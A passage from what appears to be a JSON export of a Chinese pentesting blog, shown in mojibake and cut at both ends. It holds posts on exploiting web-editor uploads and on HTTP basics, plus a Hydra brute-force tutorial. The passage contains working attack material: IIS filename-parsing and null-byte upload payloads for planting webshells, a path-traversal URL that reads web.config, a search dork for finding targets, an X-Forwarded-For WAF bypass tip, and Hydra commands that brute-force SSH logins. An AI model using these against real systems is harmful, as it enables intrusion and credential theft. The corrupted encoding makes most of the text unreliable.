Keditç¼–è¾‘å™¨ï¼šPHPWEBç½‘ç«™ç®¡ç†ç³»ç»Ÿåå°ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š ç¬¬ä¸€ç§æ˜¯åˆ©ç”¨iis6.0æ–‡ä»¶åè§£ææ¼æ´ï¼š xx.php;xx.jpg ç¬¬äºŒç§æ–¹å¼ï¼š %00æˆªæ–­ xx.php%00jpg ute Editoråœ¨çº¿ç¼–è¾‘å™¨ï¼šæœ¬åœ°åŒ…å«æ¼æ´ å½±å“ç‰ˆæœ¬ï¼š Cute Editor For Net 6.4 è„†å¼±æè¿°ï¼š å¯ä»¥éšæ„æŸ¥çœ‹ç½‘ç«™æ–‡ä»¶å†…å®¹ï¼Œå±å®³è¾ƒå¤§ æ”»å‡»åˆ©ç”¨ï¼š http://www.xx.com/Cute_Client?CuteEditor/Load.ashx?type=image&amp;file=../../../web.config Cute Editor Asp.Netç‰ˆï¼š åˆ©ç”¨iisè§£ææ¼æ´è·å¾—æƒé™ å½±å“ç‰ˆæœ¬ï¼š CuteEditor for ASP.NETä¸­æ–‡ç‰ˆè„†å¼±æè¿°ï¼š è„†å¼±æè¿°ï¼š CuteEditorå¯¹ä¸Šä¼ æ–‡ä»¶åæœªé‡å‘½åï¼Œå¯¼è‡´å…¶å¯åˆ©ç”¨IISæ–‡ä»¶åè§£æBugè·å¾—webshellæƒé™ã€‚ æ”»å‡»åˆ©ç”¨ï¼š å¯é€šè¿‡åœ¨æœç´¢å¼•æ“ä¸­é”®å…¥å…³é”®å­— inurl:Post.aspx?SmallClassID= æ¥æ‰¾åˆ°æµ‹è¯•ç›®æ ‡ã€‚ åœ¨ç¼–è¾‘å™¨ä¸­ç‚¹å‡»â€œå¤šåª’ä½“æ’å…¥â€ï¼Œä¸Šä¼ ä¸€ä¸ªåä¸ºâ€œxxx.asp;.aviâ€çš„ç½‘é©¬ï¼Œä»¥æ­¤è·å¾—æƒé™ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"åº”ç”¨ç¨‹åºæŠ€æœ¯","slug":"åº”ç”¨ç¨‹åºæŠ€æœ¯","date":"2019-06-12T12:00:28.000Z","updated":"2020-09-20T08:59:47.691Z","comments":true,"path":"2019/06/12/åº”ç”¨ç¨‹åºæŠ€æœ¯/","link":"","permalink":"https://zhangyanlady.github.io/2019/06/12/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8A%80%E6%9C%AF/","excerpt":"","text":"Web åº”ç”¨ç¨‹åºæŠ€æœ¯Webåº”ç”¨ç¨‹åºä½¿ç”¨å„ç§ä¸åŒçš„æŠ€æœ¯å®ç°å…¶åŠŸèƒ½ã€‚æœ¬ç« ç®€è¦ä»‹ç»æ¸—é€ä¾§è¯•å‘˜åœ¨æ”»å‡»Webåº”ç”¨ç¨‹åºæ—¶å¯èƒ½é‡åˆ°çš„å…³é”®æŠ€æœ¯ã€‚æˆ‘ä»¬å°†åˆ†æHTTPåè®®ã€æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¸¸ç”¨çš„æŠ€æœ¯ä»¥åŠç”¨äºåœ¨å„ç§æƒ…å½¢ä¸‹å‘ˆç°æ•°æ®çš„ç¼–ç æ–¹æ¡ˆã€‚è¿™äº›æŠ€æœ¯å¤§éƒ½ç®€å•æ˜“æ‡‚ï¼ŒæŒæ¡å…¶ç›¸å…³ç‰¹æ€§å¯¹äºå‘Webåº”ç”¨ç¨‹åºå‘åŠ¨æœ‰æ•ˆæ”»å‡»æå…¶é‡è¦ã€‚ 1ã€cookieä¸sessionçš„åŒºåˆ«1ã€cookieæ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsessionæ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Šã€‚ 2ã€cookieä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„COOKIEå¹¶è¿›è¡ŒCOOKIEæ¬ºéª—è€ƒè™‘åˆ°å®‰å…¨åº”å½“ä½¿ç”¨sessionã€‚ 3ã€sessionä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“è®¿é—®å¢å¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½è€ƒè™‘åˆ°å‡è½»æœåŠ¡å™¨æ€§èƒ½æ–¹é¢ï¼Œåº”å½“ä½¿ç”¨COOKIEã€‚ 4ã€å•ä¸ªcookieä¿å­˜çš„æ•°æ®ä¸èƒ½è¶…è¿‡4Kï¼Œå¾ˆå¤šæµè§ˆå™¨éƒ½é™åˆ¶ä¸€ä¸ªç«™ç‚¹æœ€å¤šä¿å­˜20ä¸ªcookieã€‚ 5ã€æ‰€ä»¥ä¸ªäººå»ºè®®ï¼šå°†ç™»é™†ä¿¡æ¯ç­‰é‡è¦ä¿¡æ¯å­˜æ”¾ä¸ºSESSION å…¶ä»–ä¿¡æ¯å¦‚æœéœ€è¦ä¿ç•™ï¼Œå¯ä»¥æ”¾åœ¨COOKIEä¸­ 2ã€ç”¨è‡ªå·±çš„è¯­è¨€æè¿°getã€postã€Acceptã€Refererã€User-Agentã€hostã€cookieã€X_Forwarded_forã€Locationå„è¯·æ±‚å¤´çš„å«ä¹‰Connectionè¡¨ç¤ºæŒä¹…çš„å®¢æˆ·ç«¯ä¸æœåŠ¡è¿æ¥ã€‚ï¼ˆcloseå…³é—­ï¼‰ getï¼šè®¿é—®çš„åœ°å€ï¼Œé‡Œé¢æœ‰=ä»€ä¹ˆä»€ä¹ˆçš„æ˜¯å‚æ•°ä¸€èˆ¬å¯ä»¥æ’å…¥payllodyï¼Œå¯ä»¥æ’å…¥æ”»å‡»ä»£ç å¦‚æœæ²¡æœ‰ä¸€èˆ¬æ²¡æ¼æ´ï¼ŒHTTPç‰ˆæœ¬1.1å¿…é¡»ä½¿ç”¨hostè¯·æ±‚å¤´getå‘é€çš„æ•°æ®åœ¨urlå…¬å¼€ post:ä¸€èˆ¬ä¸ºè¡¨å•æäº¤ï¼›é€šè¿‡postæäº¤çš„æ•°æ®åœ¨urlä¸å¯è§ï¼› accept:è¡¨ç¤ºæµè§ˆå™¨æ”¯æŒçš„MIMEç±»å‹ï¼Œä¼˜å…ˆé¡ºåºæ˜¯ä»å·¦åˆ°å³è¡¨ç¤ºæˆ‘å½“å‰çš„æµè§ˆå™¨å¸Œæœ›æ¥å—ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼Œè¿™æ˜¯è¯·æ±‚é¦–éƒ¨ï¼Œå½“æœåŠ¡å™¨æ²¡æœ‰å®¢æˆ·ç«¯æƒ³è¦çš„èµ„æºçš„åª’ä½“ç±»å‹æ—¶ï¼Œä¼šè¿”å›406 Not Acceptable å“åº”ã€‚å½“ç„¶ä½¿ç”¨äº† / è¡¨ç¤ºæ„¿æ„æ¥å—ä»»æ„ç±»å‹çš„èµ„æºï¼Œæ‰€ä»¥åº”ä¸ä¼šçœ‹åˆ°è¿™ä¸ªå“åº”ã€‚å¦å¤–ï¼Œè¿™é‡Œçš„ q è¡¨ç¤ºæƒé‡ï¼Œæƒé‡åœ¨ 0-1 ä¹‹é—´ï¼Œï¼ˆé¡ºåºä¸ºé‡å¤§åˆ°å°ä¼˜å…ˆé¡ºåºï¼‰å¯ä»¥ç†è§£æˆå®¢æˆ·ç«¯åœ¨è¿™äº›ç»™å‡ºçš„ç±»å‹ä¸­ï¼Œæƒ³ä¼˜å…ˆæ¥å—ä»€ä¹ˆç±»å‹ï¼Œå¯ä»¥æœåŠ¡å™¨å°±å¯ä»¥æ ¹æ®å®¢æˆ·ç«¯çš„éœ€è¦è¿”å›ç›¸åº”çš„èµ„æºã€‚ å¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä¸º 1 ã€‚è¿™é‡Œå‰é¢å‡ ä¸ªç±»å‹éƒ½æ²¡æœ‰æ ‡æ˜ï¼Œåˆ™é»˜è®¤éƒ½æ˜¯ 1 ï¼Œè¡¨ç¤ºä¼˜å…ˆè¿™äº›ç±»å‹ï¼Œåé¢çš„ 0.9 è¡¨ç¤ºå‰é¢éƒ½æ²¡æœ‰å°±ç”¨è¿™ä¸ªï¼Œæœ€åçš„ 0.8 è¡¨ç¤ºå¦‚æœéƒ½æ²¡æœ‰ï¼Œé‚£ä¹ˆä»»æ„çš„ç±»å‹éƒ½è¡Œï¼‰ Refererï¼šå‘æœåŠ¡å™¨æäº¤è·³è½¬é“¾æ¥æ‰€åœ¨åœ°å€ï¼Œå¦‚æœç”¨æˆ·æ—¶é€šè¿‡é“¾æ¥è·³è½¬åˆ°å½“å‰é¡µé¢ï¼Œæ­¤è¯·æ±‚åŸŸä¸ºé“¾æ¥æ‰€åœ¨ç•Œé¢çš„URLã€‚ å½“è®¿é—®æŸä¸ªç½‘ç«™æ˜¯é€šè¿‡ä»€ä¹ˆè®¿é—®çš„ï¼Œæœ‰æ—¶å€™ä¸€å®šè¦ä»æŸä¸ªåœ°æ–¹è®¿é—®æŒ‘æˆ˜ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹ä¸ºä»è®¾å®šçš„åœ°æ–¹è®¿é—® Use-Agent:ç”¨æ¥æ”¶é›†æ•°æ®ä¾‹å¦‚ä»€ä¹ˆç”µè„‘ï¼Œä»€ä¹ˆæµè§ˆå™¨,MACåœ°å€ç­‰ç­‰ç”¨æ¥å–è¯ Host:å‘æœåŠ¡å™¨æäº¤ï¼ˆæœåŠ¡å™¨ï¼‰ä¸»æœºå’Œç«¯å£å· Cookie:ç¬¬ä¸€æ¬¡è®¿é—®å¯èƒ½ä¸å¸¦ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨æœ¬åœ°è®°å½•å‘å®¢æˆ·ç«¯å‘é€æ¥éªŒè¯èº«ä»½ X_Forwarded_forï¼šä¼ªé€ ipç™»å½•ï¼Œä¹Ÿå¯ä»¥ä¼ªé€ å¤šIPç™»å½•ä¾‹å¦‚127.0.$è®¾ç½®ä¸ªå­—å…¸$.$è®¾ç½®ä¸ªå­—å…¸$ç”¨äºè¿‡wafç»•åå°æŠ“åŒ…æ—¶æ·»åŠ  Location: è¿™ä¸ªæ¶ˆæ¯å¤´ç”¨äºåœ¨é‡å®šå‘å“åº”(é‚£äº›çŠ¶æ€ç ä»¥3å¼€å¤´çš„å“åº”)ä¸­è¯´æ˜é‡å®šå‘çš„ç›®æ ‡ã€‚è·³è½¬ 3ã€å¸¸ç”¨ http æ”¯æŒçš„æ–¹æ³•æœ‰é‚£äº›ï¼ŒåŒæ—¶å¯¹Headã€optionsã€putã€getã€postç”¨è‡ªå·±çš„è¯­è¨€è¿›è¡Œæè¿°HTTPè¯·æ±‚çš„å¸¸ç”¨æ–¹æ³•æœ‰ï¼šGETæ–¹æ³•ã€POSTæ–¹æ³•ã€HEADæ–¹æ³•ã€PUTæ–¹æ³•ã€DELETEæ–¹æ³•ã€CONNECTæ–¹æ³•ã€OPTIONSæ–¹æ³•ã€TRACEæ–¹æ³•ã€‚ Head:ä¸getç›¸ä¼¼ï¼Œæ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨ã€‚wafä¸€èˆ¬ä¸æ‹¦æˆª Options:æŸ¥çœ‹å½“å‰ç½‘ç«™æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ã€‚ç”¨æ¥æ£€æµ‹æœåŠ¡å™¨æ€§èƒ½ Putï¼šæŠŠæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼ˆåä¸€ä¸ªä¼šè¦†ç›–ä¸Šä¸€ä¸ª0ï¼Œä¸€èˆ¬ç”¨æ¥æ”¹èµ„æºï¼‰ getï¼šä»æœåŠ¡å™¨è·å¾—æ•°æ®è¿”å›å‰è¿›ä¸å½±å“ post:å‘æœåŠ¡å™¨ä¼ é€æ•°æ®åä¸€ä¸ªèµ„æºä¸ä¼šè¦†ç›–ä¸Šä¸€ä¸ªè¿”å›å‰ä¼šä¸€ç›´å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼ˆä¸€èˆ¬ç”¨å¢åŠ èµ„æºï¼‰ TRACE.è¿™ç§æ–¹æ³•ä¸»è¦ç”¨äºè¯Šæ–­ã€‚æœåŠ¡å™¨åº”åœ¨å“åº”ä¸»ä½“ä¸­è¿”å›å…¶æ”¶åˆ°çš„è¯·æ±‚æ¶ˆæ¯çš„å…·ä½“å†…å®¹ã€‚è¿™ç§æ–¹æ³•å¯ç”¨äºæ£€æµ‹å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´æ˜¯å¦å­˜åœ¨ä»»ä½•æ“çºµè¯·æ±‚çš„ä»£ç†æœåŠ¡å™¨ã€‚ 4ã€cookieå¤´é‡Œé¢çš„secureä¸HttpOnlyé¡¹åˆ†åˆ«ä»£è¡¨ä»€ä¹ˆå«ä¹‰Secureï¼šå¦‚æœè®¾ç½®è¿™ä¸ªå±æ€§.åˆ™ä»…åœ¨HTTPSè¯·æ±‚ä¸­æäº¤cookie. HttpOnlyï¼šå¦‚æœè®¾ç½®è¿™ä¸ªå±æ€§ï¼Œå°†æ— æ³•é€šè¿‡å®¢æˆ·ç«¯JavaScriptç›´æ¥è®¿é—®cookie. 5ã€çŠ¶æ€ç æ¯æ¡HTTPå“åº”æ¶ˆæ¯éƒ½å¿…é¡»åœ¨ç¬¬ä¸€è¡Œä¸­åŒ…å«ä¸€ä¸ªçŠ¶æ€ç ï¼Œè¯´æ˜è¯·æ±‚çš„ç»“æœã€‚æ ¹æ®ä»£ç çš„ç¬¬ä¸€ ä½æ•°å­—ï¼Œå¯å°†çŠ¶æ€ç åˆ†ä¸ºä»¥ä¸‹5ç±»ã€‚ 1xx -æä¾›ä¿¡æ¯ã€‚ 2xxâ€”è¯·æ±‚è¢«æˆåŠŸæäº¤ã€‚ 3xxâ€”å®¢æˆ·ç«¯è¢«é‡å®šå‘åˆ°å…¶ä»–èµ„æºã€‚ 4xx-è¯·æ±‚åŒ…å«æŸç§é”™è¯¯ã€‚ 5xxâ€”æœåŠ¡å™¨æ‰§è¡Œè¯·æ±‚æ—¶é‡åˆ°é”™è¯¯ã€‚ è¿˜æœ‰å¤§é‡ç‰¹æ®ŠçŠ¶æ€ç ï¼Œå…¶ä¸­è®¸å¤šçŠ¶æ€ç ä»…ç”¨åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ã€‚ä¸‹é¢åˆ—å‡ºæ¸—é€æµ‹è¯•å‘˜åœ¨æ”»å‡»Web åº”ç”¨ç¨‹åºæ—¶æœ€æœ‰å¯èƒ½é‡åˆ°çš„çŠ¶æ€ç åŠå…¶ç›¸å…³çš„åŸå› çŸ­è¯­ã€‚ 100Continueã€‚å½“å®¢æˆ·ç«¯æäº¤ä¸€ä¸ªåŒ…å«ä¸»ä½“çš„è¯·æ±‚æ—¶.å°†å‘é€è¿™ä¸ªå“åº”ã€‚è¯¥å“åº”è¡¨ç¤ºå·²æ”¶åˆ°è¯·æ±‚æ¶ˆæ¯å¤´.å®¢æˆ·ç«¯åº”ç»§ç»­å‘é€ä¸»ä½“ã€‚è¯·æ±‚å®Œæˆåï¼Œå†ç”±æœåŠ¡å™¨è¿”å›å¦ä¸€ä¸ªå“åº”ã€‚ 200Okã€‚æœ¬çŠ¶æ€ç è¡¨ç¤ºå·²æˆåŠŸæäº¤è¯·æ±‚ï¼Œä¸”å“åº”ä¸»ä½“ä¸­åŒ…å«è¯·æ±‚ç»“æœã€‚ 201Created. PUTè¯·æ±‚çš„å“åº”è¿”å›è¿™ä¸ªçŠ¶æ€ç ï¼Œè¡¨ç¤ºè¯·æ±‚å·²æˆåŠŸæäº¤ã€‚ 301Moved Permanentlyã€‚æœ¬çŠ¶æ€ç å°†æµè§ˆå™¨æ°¸ä¹…é‡å®šå‘åˆ°å¦å¤–ä¸€ä¸ªåœ¨Locationæ¶ˆæ¯å¤´ä¸­æŒ‡å®šçš„URLã€‚ä»¥åå®¢æˆ·ç«¯åº”ä½¿ç”¨æ–°URLæ›¿æ¢åŸå§‹URLã€‚ 302Foundã€‚æœ¬çŠ¶æ€ç å°†æµè§ˆå™¨æš‚æ—¶é‡å®šå‘åˆ°å¦å¤–ä¸€ä¸ªåœ¨Locationæ¶ˆæ¯å¤´ä¸­æŒ‡å®šçš„URL.å®¢æˆ·ç«¯åº”åœ¨éšåçš„è¯·æ±‚ä¸­æ¢å¤ä½¿ç”¨åŸå§‹URL. 304Not Modifiedã€‚æœ¬çŠ¶æ€ç æŒ‡ç¤ºæµè§ˆå™¨ä½¿ç”¨ç¼“å­˜ä¸­ä¿å­˜çš„æ‰€è¯·æ±‚èµ„æºçš„å‰¯æœ¬ã€‚æœåŠ¡å™¨ä½¿ç”¨If-Modified-Sinceä¸å·¥f-None-Matchæ¶ˆæ¯å¤´ç¡®å®šå®¢æˆ·ç«¯æ˜¯å¦æ‹¥æœ‰æœ€æ–°ç‰ˆæœ¬çš„èµ„æºã€‚ 400Bad Requestã€‚æœ¬çŠ¶æ€ç è¡¨ç¤ºå®¢æˆ·ç«¯æäº¤äº†ä¸€ä¸ªæ— æ•ˆçš„HTTPè¯·æ±‚ã€‚å½“ä»¥æŸç§æ— æ•ˆçš„æ–¹å¼ä¿®æ”¹è¯·æ±‚æ—¶(ä¾‹å¦‚åœ¨URLä¸­æ’äººä¸€ä¸ªç©ºæ ¼ç¬¦)ï¼Œå¯èƒ½ä¼šé‡åˆ°è¿™ä¸ªçŠ¶æ€ç ã€‚ 401Unauthorized.æœåŠ¡å™¨åœ¨è®¸å¯è¯·æ±‚å‰è¦æ±‚HTTPè¿›è¡Œèº«ä»½éªŒè¯ã€‚WWW-Authenticateæ¶ˆæ¯å¤´è¯¦ç»†è¯´æ˜æ‰€æ”¯æŒçš„èº«ä»½éªŒè¯ç±»å‹ã€‚ 403Forbiddenã€‚æœ¬çŠ¶æ€ç æŒ‡å‡ºï¼Œä¸ç®¡æ˜¯å¦é€šè¿‡èº«ä»½éªŒè¯ï¼Œç¦æ­¢ä»»ä½•äººè®¿é—®è¢«è¯·æ±‚çš„èµ„æºã€‚ 404Not Foundã€‚æœ¬çŠ¶æ€ç è¡¨ç¤ºæ‰€è¯·æ±‚çš„èµ„æºå¹¶ä¸å­˜åœ¨ã€‚ ]405Method Not Allowedã€‚æœ¬çŠ¶æ€ç è¡¨ç¤ºæŒ‡å®šçš„URLä¸æ”¯æŒè¯·æ±‚ä¸­ä½¿ç”¨çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¯•å›¾åœ¨ä¸æ”¯æŒPUTæ–¹æ³•çš„åœ°æ–¹ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œå°±ä¼šæ”¶åˆ°æœ¬çŠ¶æ€ç ã€‚ 413Request Entity Too Largeã€‚å¦‚æœåœ¨æœ¬åœ°ä»£ç ä¸­æ¢æŸ¥ç¼“å†²å™¨æ»‹å‡ºç€šæ´å¹¶å°±æ­¤æäº¤è¶…é•¿æ•°æ®ä¸².åˆ™æœ¬çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚ä¸»ä½“è¿‡é•¿ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ã€‚ 414Request URI Too Longã€‚ä¸å‰ä¸€ä¸ªå“åº”ç±»ä¼¼ï¼Œæœ¬çŠ¶æ€ç è¡¨ç¤ºè¯·æ±‚ä¸­çš„URLè¿‡é•¿ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ã€‚ 500Internal Server Errorã€‚æœ¬çŠ¶æ€ç è¡¨ç¤ºæœåŠ¡å™¨åœ¨æ‰§è¡Œè¯·æ±‚æ—¶é‡åˆ°é”™è¯¯ã€‚å½“æäº¤æ— æ³•é¢„æ–™çš„è¾“äººã€åœ¨åº”ç”¨ç¨‹åºå¤„ç†è¿‡ç¨‹ä¸­é€ æˆæ— æ³•å¤„ç†çš„é”™è¯¯æ—¶ï¼Œé€šå¸¸ä¼šæ”¶åˆ°æœ¬çŠ¶æ€ç ã€‚åº”è¯¥ä»”ç»†æ£€æŸ¥æœåŠ¡å™¨å“åº”çš„æ‰€æœ‰å†…å®¹ï¼Œäº†è§£ä¸é”™è¯¯æ€§è´¨æœ‰å…³çš„è¯¦æƒ…ã€‚ 503Service Unavailableã€‚é€šå¸¸ï¼Œæœ¬çŠ¶æ€ç è¡¨ç¤ºå°½ç®¡WebæœåŠ¡å™¨è¿è½¬æ­£å¸¸.å¹¶ä¸”èƒ½å¤Ÿå“åº”è¯·æ±‚ï¼Œä½†æœåŠ¡å™¨è®¿é—®çš„åº”ç”¨ç¨‹åºè¿˜æ˜¯æ— æ³•ä½œå‡ºå“åº”ã€‚åº”è¯¥è¿›è¡Œæ ¸å®ï¼Œæ˜¯å¦å› ä¸ºæ‰§è¡Œäº†æŸç§è¡Œä¸ºè€Œé€ æˆè¿™ä¸ªç»“æœã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"hydra","slug":"hydra","date":"2019-05-28T13:46:20.000Z","updated":"2020-09-20T09:01:52.275Z","comments":true,"path":"2019/05/28/hydra/","link":"","permalink":"https://zhangyanlady.github.io/2019/05/28/hydra/","excerpt":"","text":"hydraæ˜¯è‘—åé»‘å®¢ç»„ç»‡thcçš„ä¸€æ¬¾å¼€æºçš„æš´åŠ›å¯†ç ç ´è§£å·¥å…·ï¼Œå¯ä»¥åœ¨çº¿ç ´è§£å¤šç§å¯†ç ã€‚å®˜ç½‘ï¼šhttp://www.thc.org/thc-hydraï¼Œå¯æ”¯æŒAFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPPç­‰ç±»å‹å¯†ç ã€‚ è¿™æ¬¾æš´åŠ›å¯†ç ç ´è§£å·¥å…·ç›¸å½“å¼ºå¤§ï¼Œæ”¯æŒå‡ ä¹æ‰€æœ‰åè®®çš„åœ¨çº¿å¯†ç ç ´è§£ï¼Œå…¶å¯†ç èƒ½å¦è¢«ç ´è§£å…³é”®åœ¨äºå­—å…¸æ˜¯å¦è¶³å¤Ÿå¼ºå¤§ã€‚å¯¹äºç¤¾ä¼šå·¥ç¨‹å‹æ¸—é€æ¥è¯´ï¼Œæœ‰æ—¶èƒ½å¤Ÿå¾—åˆ°äº‹åŠåŠŸå€çš„æ•ˆæœã€‚æœ¬æ–‡ä»…ä»å®‰å…¨è§’åº¦å»æ¢è®¨æµ‹è¯•ï¼Œè¯·å‹¿ç”¨äºéæ³•äº‹ä»¶ã€‚ å®‰è£…ï¼š 1.yum å®‰è£…ç›¸åº”ä¾èµ–åŒ… # yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel 2.hydraç¼–è¯‘å®‰è£… # cd /usr/local/src # wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz # tar zxf hydra-6.3-src.tar.gz # cd hydra-6.3-src # ./configure # make # make install # ./configureä¼šæ£€æµ‹å½“å‰ç³»ç»Ÿä¸€äº›ç»„ä»¶é…ç½®ï¼Œä¸»è¦æ˜¯å¯¹äºç ´è§£æ”¯æŒæ¨¡å—çš„æ£€æµ‹ï¼Œå¯æ ¹æ®éœ€è¦å®‰è£…å¯¹åº”çš„æ”¯æŒåº“å’Œä¾èµ–åŒ… # make # make install å‚æ•°ï¼š hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT] -R ç»§ç»­ä»ä¸Šä¸€æ¬¡è¿›åº¦æ¥ç€ç ´è§£ã€‚ -S é‡‡ç”¨SSLé“¾æ¥ã€‚ -s PORT å¯é€šè¿‡è¿™ä¸ªå‚æ•°æŒ‡å®šéé»˜è®¤ç«¯å£ã€‚ -l LOGIN æŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚ -L FILE æŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚ -p PASS å°å†™ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸ã€‚ -P FILE å¤§å†™ï¼ŒæŒ‡å®šå¯†ç å­—å…¸ã€‚ -e ns å¯é€‰é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šç”¨æˆ·å’Œå¯†ç è¯•æ¢ã€‚ -C FILE ä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å:å¯†ç â€æ¥ä»£æ›¿-L/-På‚æ•°ã€‚ -M FILE æŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ä¸€è¡Œä¸€æ¡ã€‚ -o FILE æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚ -f åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚ -t TASKS åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¸º16ã€‚ -w TIME è®¾ç½®æœ€å¤§è¶…æ—¶çš„æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤æ˜¯30sã€‚ -v / -V æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ã€‚ server ç›®æ ‡ip service æŒ‡å®šæœåŠ¡åï¼Œæ”¯æŒçš„æœåŠ¡å’Œåè®®ï¼štelnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afpç­‰ç­‰ã€‚ OPT å¯é€‰é¡¹ ä½¿ç”¨ï¼š 1. æ‰‹åŠ¨åˆ›å»ºç”¨æˆ·åå­—å…¸å’Œå¯†ç å­—å…¸ï¼Œè¿™é‡Œåªæ˜¯ä¸ºäº†æ¼”ç¤ºï¼ŒåªåŠ äº†å‡ ä¸ªç”¨æˆ·åå’Œå¼±å£ä»¤ã€‚çœŸæ­£ç ´è§£æ—¶ï¼Œéœ€è¦åˆ©ç”¨å¯†ç å­—å…¸ç”Ÿæˆå™¨ç”Ÿæˆå¼ºå¤§çš„å­—å…¸ 2.ç ´è§£sshï¼š # hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.0.106 ssh ç ´è§£æˆåŠŸï¼Œç›´æ¥æ˜¾ç¤ºç»“æœã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ -o é€‰é¡¹æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶ã€‚ # hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.1.104 ssh å…¶å®ƒå®ä¾‹ï¼š 1.ç ´è§£sshï¼š # hydra -l ç”¨æˆ·å -p å¯†ç å­—å…¸ -t çº¿ç¨‹-vV -e ns ip ssh # hydra -l ç”¨æˆ·å -p 